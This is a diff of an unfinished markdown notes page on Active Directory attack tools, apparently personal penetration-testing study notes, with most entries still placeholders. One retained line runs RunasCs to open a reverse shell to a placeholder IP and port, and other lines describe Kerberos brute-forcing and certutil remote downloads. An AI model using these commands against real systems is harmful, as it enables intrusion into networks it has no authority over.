@@ -1,17 +1,3 @@
----
-layout:
-  title:
-    visible: true
-  description:
-    visible: false
-  tableOfContents:
-    visible: true
-  outline:
-    visible: false
-  pagination:
-    visible: true
----
-
 # Tools and Utilities (WIP)
 
 Here we can find some tools and utilities commonly used for practices related to Active Directory:
@@ -20,13 +6,9 @@ Here we can find some tools and utilities commonly used for practices related to
 
 * H
 
-## <mark style="color:green;">kerberos</mark>
-
-* H
-
 ## <mark style="color:green;">kerbruter</mark>
 
-* brute forcing attacks on kerberos environments
+* Brute-forcing attacks on Kerberos environments
 
 ## <mark style="color:green;">ldapdomaindump</mark>
 
@@ -40,6 +22,10 @@ Here we can find some tools and utilities commonly used for practices related to
 
 * Binary for certificate management, encryption, decryption, hashing, file verification, and remote file download, among others.
 * It comes by default on Windows Systems
+
+### <mark style="color:yellow;">Commands</mark>
+
+* Usage
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```powershell
@@ -82,14 +68,26 @@ RunasCs.exe $username $pass $command -r $IP:$port #Execute and generate RevShell
 ```
 {% endcode %}
 
+## <mark style="color:green;">Netexec</mark>
 
+* H
 
-netexec: evolution of crackmaexec
+## <mark style="color:green;">SMBmap</mark>
 
-smbmap: enumeration of smb info
+* H
 
-en smbclient  recurse -> ls for recursive listing
+## <mark style="color:green;">bloody</mark>
 
+* H
 
+## <mark style="color:green;">pwdump</mark>
 
-e
+* H
+
+## <mark style="color:green;">Powerview</mark>
+
+* H
+
+## <mark style="color:green;">ophcrack</mark>
+
+* H
